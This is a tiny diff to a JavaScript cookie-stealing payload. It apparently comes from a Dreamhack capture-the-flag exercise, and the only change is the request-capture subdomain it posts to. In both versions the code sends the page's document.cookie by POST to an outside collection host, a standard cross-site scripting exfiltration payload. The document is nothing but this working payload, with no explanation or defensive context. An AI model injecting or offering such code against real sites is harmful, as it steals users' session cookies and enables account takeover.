@@ -1,4 +1,4 @@
-fetch("https://fnfzlhe.request.dreamhack.games", {
+fetch("https://lxeekaw.request.dreamhack.games", {
   method: "POST",
   body: document.cookie
 });
